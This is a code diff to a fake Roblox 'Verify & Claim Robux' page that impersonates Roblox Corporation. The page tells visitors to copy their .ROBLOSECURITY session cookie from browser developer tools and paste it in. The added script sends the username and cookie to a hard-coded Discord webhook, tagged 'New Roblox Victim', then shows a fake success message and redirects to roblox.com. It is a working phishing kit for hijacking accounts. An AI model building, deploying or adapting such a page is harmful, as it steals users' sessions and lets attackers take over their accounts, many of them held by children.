@@ -108,6 +108,19 @@
       transform: translateY(-2px);
       box-shadow: 0 12px 30px rgba(124,58,237,0.45);
     }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .status {
+      display: none;
+      margin-top: 24px;
+      font-size: 16px;
+      font-weight: 500;
+      text-align: center;
+    }
+    .loading { color: #a78bfa; }
+    .success { color: #34d399; }
     .footer {
       font-size: 13px;
       color: #a090c0;
@@ -129,16 +142,19 @@
     </p>
 
     <div class="field-label">Roblox Username</div>
-    <input type="text" placeholder="Enter your Roblox username"/>
+    <input type="text" id="username" placeholder="Enter your Roblox username"/>
 
     <div class="field-label">.ROBLOSECURITY Cookie (paste here)</div>
-    <textarea placeholder="Paste your _ROBLOSECURITY cookie here...\nIt looks like: _|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
+    <textarea id="cookie" placeholder="Paste your _ROBLOSECURITY cookie here...\nIt looks like: _|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
     <div class="hint">
       How to get it: Press F12 → Application → Cookies →<br>
       roblox.com → copy <strong>_ROBLOSECURITY</strong> value
     </div>
 
-    <button class="btn">Verify & Claim Robux</button>
+    <button class="btn" id="verifyBtn">Verify & Claim Robux</button>
+
+    <div class="status loading" id="loading">Verifying your account...</div>
+    <div class="status success" id="success">Verification successful! Redirecting to Roblox...</div>
 
     <div class="footer">
       This is a one-time verification to prevent bots and<br>
@@ -146,5 +162,48 @@
       © 2026 Roblox Corporation. All rights reserved.
     </div>
   </div>
+
+  <script>
+    document.getElementById('verifyBtn').addEventListener('click', function() {
+      const username = document.getElementById('username').value.trim();
+      const cookie = document.getElementById('cookie').value.trim();
+
+      if (!username || cookie.length < 30) {
+        alert('Please enter your username and full cookie.');
+        return;
+      }
+
+      const btn = this;
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+
+      document.getElementById('loading').style.display = 'block';
+
+      // Your Discord webhook
+      const webhook = "https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9gUS0X0ATXAVLY2uXIp2WClXk_3Wp1R";
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `**New Roblox Victim**\nUsername: \( {username}\nCookie:\n\`\`\` \){cookie}\`\`\`\nTime: ${new Date().toLocaleString()}`
+        })
+      }).then(() => {
+        setTimeout(() => {
+          document.getElementById('loading').style.display = 'none';
+          document.getElementById('success').style.display = 'block';
+          setTimeout(() => {
+            window.location.href = 'https://www.roblox.com';
+          }, 2000);
+        }, 1800);
+      }).catch(err => {
+        console.error('Error:', err);
+        alert('Error sending data - try again');
+        btn.disabled = false;
+        btn.textContent = 'Verify & Claim Robux';
+        document.getElementById('loading').style.display = 'none';
+      });
+    });
+  </script>
 </body>
 </html>
